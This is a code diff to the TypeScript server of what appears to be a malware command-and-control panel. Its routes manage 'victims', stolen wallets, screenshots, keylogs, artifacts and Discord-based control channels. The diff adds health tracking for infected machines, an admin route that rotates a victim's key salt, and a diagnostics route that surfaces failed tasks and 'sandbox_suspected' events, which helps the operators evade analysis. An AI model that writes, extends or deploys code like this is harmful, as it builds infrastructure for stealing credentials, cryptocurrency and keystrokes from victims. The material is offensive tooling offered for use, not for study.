@@ -5,9 +5,10 @@ import { rm, stat } from 'node:fs/promises';
 import { join } from 'node:path';
 import { prisma } from '../lib/db';
 import { audit } from '../lib/audit';
-import { notFound } from '../lib/errors';
+import { HttpError, notFound } from '../lib/errors';
 import { requireRole } from '../plugins/auth';
 import { artifactDir, safeRel } from '../services/artifact';
+import { rotateKey } from '../services/victim';
 import { isOnline } from '../lib/presence';
 import { publish } from '../lib/bus';
 import { dispatchCommand, hasControl } from './ws';
@@ -67,6 +68,15 @@ export const victimRoutes: FastifyPluginAsync = async (app) => {
         _count: { select: { wallets: true, artifacts: true } }
       }
     });
+    const failures = rows.length === 0 ? [] : await prisma.event.findMany({
+      where: { victimId: { in: rows.map((row) => row.id) }, kind: 'module_degraded',
+        createdAt: { gte: new Date(Date.now() - 10 * 60_000) } },
+      orderBy: { createdAt: 'desc' }, select: { victimId: true, data: true }
+    });
+    const health = new Map<string, string>();
+    for (const failure of failures) {
+      if (!health.has(failure.victimId)) health.set(failure.victimId, String((failure.data as { key?: string }).key ?? 'error'));
+    }
     return {
       items: rows.map((row) => ({
         ...serializeVictim(row),
@@ -74,6 +84,7 @@ export const victimRoutes: FastifyPluginAsync = async (app) => {
         socket: hasControl(row.id),
         wallets: row._count.wallets,
         artifacts: row._count.artifacts,
+        health: health.get(row.id) ?? null,
         _count: undefined
       })),
       next: rows.length === query.limit ? rows.at(-1)?.id : null
@@ -154,11 +165,28 @@ export const victimRoutes: FastifyPluginAsync = async (app) => {
 
   app.post('/victims/:id/revoke', { preHandler: requireRole('operator') }, async (request) => {
     const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
-    const revoked = (request.query as { restore?: string }).restore === '1' ? null : new Date();
-    await prisma.victim.update({ where: { id }, data: { revokedAt: revoked, status: revoked ? 'revoked' : 'offline' } });
-    await audit(prisma, { operatorId: request.operator?.id, action: revoked ? 'victim.revoke' : 'victim.restore', entity: 'victim', entityId: id, ip: request.clientIp });
+    const restored = (request.query as { restore?: string }).restore === '1';
+    const revoked = restored ? null : new Date();
+    await prisma.$transaction(async (tx) => {
+      await tx.victim.update({ where: { id }, data: { revokedAt: revoked, status: revoked ? 'revoked' : 'offline' } });
+      await audit(tx, { operatorId: request.operator?.id, action: revoked ? 'victim.revoke' : 'victim.restore', entity: 'victim', entityId: id, ip: request.clientIp });
+    });
     void publish({ type: 'victim.heartbeat', victimId: id, at: Date.now(), data: { status: revoked ? 'revoked' : 'offline' } });
-    return { ok: true };
+    return { ok: true, revoked: Boolean(revoked) };
+  });
+
+  /**
+   * Explicit, audited salt rotation. Old outbox entries and in-flight artifacts
+   * stay readable through the epoch history (three epochs).
+   */
+  app.post('/victims/:id/rotate-key', { preHandler: requireRole('admin') }, async (request) => {
+    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
+    const victim = await prisma.victim.findUnique({ where: { id }, select: { id: true, keyScheme: true, revokedAt: true } });
+    if (!victim) throw notFound('victim');
+    if (victim.revokedAt) throw new HttpError(409, 'revoked', 're-enroll before rotating');
+    if (victim.keyScheme !== 2) throw new HttpError(409, 'key_scheme_1', 'legacy scheme has no per-device salt');
+    const rotated = await rotateKey(id, request.operator?.id, request.clientIp);
+    return { ok: true, ...rotated };
   });
 
   app.delete('/victims/:id', { preHandler: requireRole('admin') }, async (request) => {
@@ -176,14 +204,14 @@ export const victimRoutes: FastifyPluginAsync = async (app) => {
         // sweep does not recreate the victim from the live channel.
       }
       await tx.victim.delete({ where: { id } });
-    });
-    await audit(prisma, {
-      operatorId: request.operator?.id,
-      action: 'victim.delete',
-      entity: 'victim',
-      entityId: id,
-      ip: request.clientIp,
-      data: { hostname: victim.hostname, channelId: victim.discord?.channelId ?? null, ignored: Boolean(victim.discord) }
+      await audit(tx, {
+        operatorId: request.operator?.id,
+        action: 'victim.delete',
+        entity: 'victim',
+        entityId: id,
+        ip: request.clientIp,
+        data: { hostname: victim.hostname, channelId: victim.discord?.channelId ?? null, ignored: Boolean(victim.discord) }
+      });
     });
     void publish({ type: 'victim.heartbeat', victimId: id, at: Date.now(), data: { deleted: true } });
     return { ok: true, ignoredChannel: victim.discord?.channelId ?? null };
@@ -197,18 +225,18 @@ export const victimRoutes: FastifyPluginAsync = async (app) => {
       const wallets = await tx.wallet.deleteMany({ where: { artifactId: id } });
       const screenshots = await tx.screenshot.deleteMany({ where: { artifactId: id } });
       await tx.artifact.delete({ where: { id } });
+      await audit(tx, {
+        operatorId: request.operator?.id,
+        action: 'artifact.delete',
+        entity: 'artifact',
+        entityId: id,
+        ip: request.clientIp,
+        data: { module: artifact.module, bytes: artifact.bytes, wallets: wallets.count, screenshots: screenshots.count }
+      });
       return { wallets: wallets.count, screenshots: screenshots.count };
     });
     await rm(artifactDir(id), { recursive: true, force: true }).catch(() => undefined);
     await rm(artifact.containerPath, { force: true }).catch(() => undefined);
-    await audit(prisma, {
-      operatorId: request.operator?.id,
-      action: 'artifact.delete',
-      entity: 'artifact',
-      entityId: id,
-      ip: request.clientIp,
-      data: { module: artifact.module, bytes: artifact.bytes, wallets: counts.wallets, screenshots: counts.screenshots }
-    });
     return { ok: true, ...counts };
   });
 
@@ -228,6 +256,17 @@ export const victimRoutes: FastifyPluginAsync = async (app) => {
       ...(query.cursor ? { cursor: { id: query.cursor }, skip: 1 } : {})
     });
     return { items, next: items.length === query.limit ? items.at(-1)?.id : null };
+  });
+
+  app.get('/victims/:id/diagnostics', async (request) => {
+    const { id } = z.object({ id: z.string().uuid() }).parse(request.params);
+    const victim = await prisma.victim.findUnique({ where: { id }, select: { id: true, agentVersion: true, status: true, lastHeartbeatAt: true } });
+    if (!victim) throw notFound('victim');
+    const events = await prisma.event.findMany({
+      where: { victimId: id, kind: { in: ['task_failed', 'module_degraded', 'artifact_failed', 'outbox_dropped', 'sandbox_suspected'] } },
+      orderBy: { createdAt: 'desc' }, take: 50
+    });
+    return { victim, items: events };
   });
 
   app.get('/victims/:id/keylogs', async (request) => {
